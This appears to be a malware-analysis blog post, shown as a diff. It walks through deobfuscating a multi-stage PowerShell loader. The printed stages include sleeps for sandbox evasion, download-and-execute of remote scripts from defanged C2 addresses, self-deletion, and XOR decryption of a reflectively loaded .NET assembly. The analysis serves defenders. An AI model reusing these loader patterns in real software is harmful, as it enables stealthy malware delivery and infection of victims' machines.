@@ -28,3 +28,108 @@ PowerShell Script:
 981),(416-346),(807-702),(814-724),(1055-981),(1062-940),(778-692),(273-241),(641-580),(746-714),(687-616),(794-693),(969-853),(247-202),(406-324),(1022-925),(921-811),(770-670),(751-640),(626-517),(574-542),(172-127),(993-916),(752-647),(725-615),(725-620),(679-570),(496-379),(877-768),(263-231),(442-392),(234-183),(509-477),(207-162),(794-717),(264-167),(977-857),(335-230),(223-114),(648-531),(482-373),(1000-968),(455-399),(373-324),(797-787),(960-877),(954-838),(239-142),(430-316),(497-381),(504-459),(231-148),(980-872),(494-393),(746-645),(774-662),(999-967),(971-926),(1017-934),(697-596),(932-833),(565-454),(366-256),(920-820),(800-685),(702-670),(166-130),(1078-966),(211-123),(1050-968),(358-242),(430-316),(1031-961),(261-191),(1067-962),(277-187),(199-125),(646-524),(808-722),(294-284),(369-359),(278-242),(334-212),(362-272),(1032-912),(476-397),(441-355),(942-823),(1009-944),(374-273),(568-536),(488-427),(956-924),(492-419),(1051-941),(1097-979),(321-210),(645-538),(1004-903),(1034-989),(602-515),(380-279),(643-545),(677-595),(366-265),(701-588),(691-574),(534-433),(1018-903),(436-320),(151-119),(553-508),(941-856),(576-461),(428-327),(975-909),(288-191),(686-571),(392-287),(756-657),(1064-984),(203-106),(672-558),(543-428),(602-497),(491-381),(369-266),(167-135),(672-627),(512-427),(583-469),(278-173),(1014-982),(411-375),(548-467),(690-610),(474-352),(582-496),(630-528),(699-633),(502-423),(238-149),(213-106),(723-713),(950-914),(337-248),(508-438),(624-558),(738-668),(650-530),(230-147),(801-695),(796-729),(745-643),(675-565),(937-870),(490-458),(657-596),(483-451),(651-560),(777-694),(509-388),(1110-995),(740-624),(745-644),(360-251),(366-320),(290-206),(568-467),(340-220),(229-113),(760-714),(230-161),(228-118),(237-138),(978-867),(251-151),(814-709),(1004-894),(387-284),(839-746),(516-458),(729-671),(378-293),(452-368),(968-898),(752-696),(739-693),(281-210),(1064-963),(239-123),(467-384),(348-232),(247-133),(627-522),(1030-920),(452-349),(910-870),(598-562),(937-815),(468-378),(476-356),(199-120),(602-516),(644-525),(210-145),(731-630),(758-712),(689-622),(670-559),(290-180),(670-554),(966-865),(304-194),(1042-926),(511-470),(348-338),(375-365),(753-680),(586-476),(944-826),(420-309),(562-455),(299-198),(293-248),(842-773),(560-440),(914-802),(403-289),(782-681),(1043-928),(551-436),(979-874),(1068-957),(813-703),(830-798),(280-235),(464-397),(1038-927),(835-726),(846-737),(664-567),(547-437),(775-675),(736-704),(725-689),(642-553),(309-239),(425-359),(393-323),(992-872),(277-194),(342-236),(571-504),(734-632),(1062-952),(993-926),(447-437),(630-620),(234-151),(825-709),(406-309),(912-798),(286-170),(379-334),(413-330),(723-615),(1011-910),(636-535),(227-115),(815-783),(151-106),(900-817),(686-585),(668-569),(1107-996),(476-366),(796-696),(335-220),(357-325),(839-785),(573-525),(911-863),(125-115),(785-775),(579-497),(498-397),(594-485),(613-502),(945-827),(578-477),(177-132),(576-503),(623-507),(788-687),(406-297),(408-376),(512-467),(315-235),(670-573),(478-362),(466-362),(834-802),(609-573),(928-848),(501-418),(330-263),(796-685),(323-214),(286-177),(841-744),(291-181),(555-455),(409-329),(271
 174),(649-533),(717-613),(927-895),(559-514),(746-676),(1087-976),(683-569),(839-740),(1092-991)))
 ```
+
+We can deobfuscate this simply by using an echo command before the command block, which gives us the following:
+
+```
+.
+iex
+﻿Set-Location C:\Windows\Temp\WindowsCrashLogs.n5szVex48r7S9FCRb9NECu
+
+$XxXWJGjPwxA = -join[char[]]((950-853),(964-866),(820-721),(1088-988),(769-668),(934-832),(1098-995),(907-803),(444-339),(600-494),(241-134),(877-769),(446-337),(270-160),(468-357),(482-370),(1047-934),(452-338),(731-616),(279-163),(685-568),(934-816),(618-499),(241-121),(1055-934),(1038-916),(742-677),(515-449),(175-108),(856-788),(1017-948),(902-832),(816-745),(438-366),(1013-940),(437-363),(370-295),(479-403),(424-347),(457-379),(262-183),(352-272),(712-631),(775-693),(601-518),(384-300),(953-868),(689-603),(779-692),(950-862),(604-515),(473-383),(1048-999),(478-428),(167-116),(968-916),(421-368),(800-746),(632-577),(532-476),(886-829),(682-634))
+$OMDFgkSKhhgc = (1..12 | ForEach-Object { Get-Random -InputObject $XxXWJGjPwxA.ToCharArray() })
+
+$UJgRlaEMS = Get-Random -Minimum 14 -Maximum 92
+Start-Sleep -Seconds $UJgRlaEMS
+$BHzAyAGYc = -join[char[]]((621-517),(985-869),(451-335),(1024-912),(453-395),(697-650),(948-901),(703-654),(255-202),(714-664),(687-641),(689-633),(194-137),(739-693),(235-186),(566-509),(984-928),(906-860),(695-645),(616-566),(419-364),(909-851),(864-811),(978-930),(401-353),(228-180),(1007-960))
+$QPzVfBOYk = $BHzAyAGYc + $OMDFgkSKhhgc
+$pXRtrFFiZJzV = Get-Random -Minimum 23 -Maximum 81
+Start-Sleep -Seconds $pXRtrFFiZJzV
+
+$zZxOVwAe = Invoke-WebRequest -UseBasicParsing -Uri $QPzVfBOYk
+$YFBFxSjCfnC = [System.Text.Encoding]::UTF8.GetString($zZxOVwAe.Content)
+
+Invoke-Expression -Command $YFBFxSjCfnC
+
+Start-Sleep -Seconds 600
+
+Remove-Item -Path $PSCommandPath -Force
+```
+
+We can work out the variables using a similar method, we'll echo the join[char] string, and convert the output from decimal to ASCII.
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/116468c3-948a-4dee-bb3d-bf702d0ee877)
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/f33f098b-ad0c-4fb0-9e85-f624dd3db7e5)
+
+
+
+[-] $XxXWJGjPwxA = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890
+
+[-] $BHzAyAGYc = hxxp[://]152.89.198[.]227:5000/
+
+Essentially the script is downloading and executing the content from the IP:Port above, with a random 12-character string URI
+
+The script which lives there is the following:
+
+```
+Set-Location C:\Windows\Temp\WindowsCrashLogs.n5szVex48r7S9FCRb9NECu
+
+$rnd = Get-Random -Minimum 13 -Maximum 91
+Start-Sleep -Seconds $rnd
+
+$randomFunctions = @(
+    { return [math]::Pi * (Get-Random -Minimum 0 -Maximum 100) },
+    { return [guid]::NewGuid().ToString() },
+    { return Get-Random -Minimum 0 -Maximum 100 }
+)
+
+$randomFunction = Get-Random -InputObject $randomFunctions`
+
+try {
+    $dotNetVersion = (Get-Command 'dotnet').Version.Major
+    if ($dotNetVersion -ge 4) {
+        Write-Host "Installed Version .NET Runtime: $dotNetVersion"
+        Start-Process -FilePath "powershell" -ArgumentList "-Command IEX(Invoke-WebRequest -UseBasicParsing 'hxxps[://]www.fuchs.com[.]sd/media/media/js/ap4.ps1')" -NoNewWindow
+    } else {
+        Write-Host "$randomValue"
+        Start-Process -FilePath "powershell" -ArgumentList "-Command IEX(Invoke-WebRequest -UseBasicParsing 'hxxps[://]www.fuchs.com[.]sd/media/media/js/ap2.ps1')" -NoNewWindow
+    }
+} catch {
+    Write-Host "$randomValue"
+    Start-Process -FilePath "powershell" -ArgumentList "-Command IEX(Invoke-WebRequest -UseBasicParsing 'hxxps[://]www.fuchs.com[.]sd/media/media/js/ap2.ps1')" -NoNewWindow
+}
+
+$rnd2 = Get-Random -Minimum 12 -Maximum 73
+Start-Sleep -Seconds $rnd2
+
+
+Remove-Item $PSCommandPath -Force
+
+```
+
+The script checks the .NET version of the victim host, the outcome of which decides which script will be executed.
+
+Next stage:
+
+```
+[byte[]] $binary = (Long Byte Arary)
+
+# [Net.ServicePointManager]::SecurityProtocol +='tls12'
+$guid = (Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid
+$config = (new-object net.webclient).downloadstring("hxxp[://]45.129.199[.]204/index.php?id=$guid&subid=ezzcAvVW").Split('|')
+$k = $config[0];
+
+for ($i = 0; $i -lt $binary.Length ; ++$i)
+{
+	$binary[$i] = $binary[$i] -bxor $k[$i % $k.Length]
+}
+
+$sm = [System.Reflection.Assembly]::Load($binary)
+$ep = $sm.EntryPoint
+
+
+$ep.Invoke($null, (, [string[]] ($config[1], $config[2], $config[3])))
+```
+
+
